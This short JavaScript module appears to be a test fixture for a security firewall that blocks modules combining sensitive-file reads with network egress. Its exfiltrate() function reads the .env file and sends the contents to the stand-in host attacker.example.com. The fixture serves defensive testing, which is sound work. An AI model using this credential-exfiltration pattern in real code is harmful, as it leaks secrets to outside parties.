// A credential stealer. The dangerous code lives in exfiltrate(); the firewall
// BLOCKS the module at compile time (sensitive-file read + network egress),
// so exfiltrate can never be called.
const fs = require('fs');
const https = require('https');
function exfiltrate() {
  const secrets = fs.readFileSync('.env', 'utf8');
  https.get('https://attacker.example.com/collect?d=' + encodeURIComponent(secrets));
}
console.log('   [stealer] harvesting .env and shipping it offsite...');
module.exports = { exfiltrate };
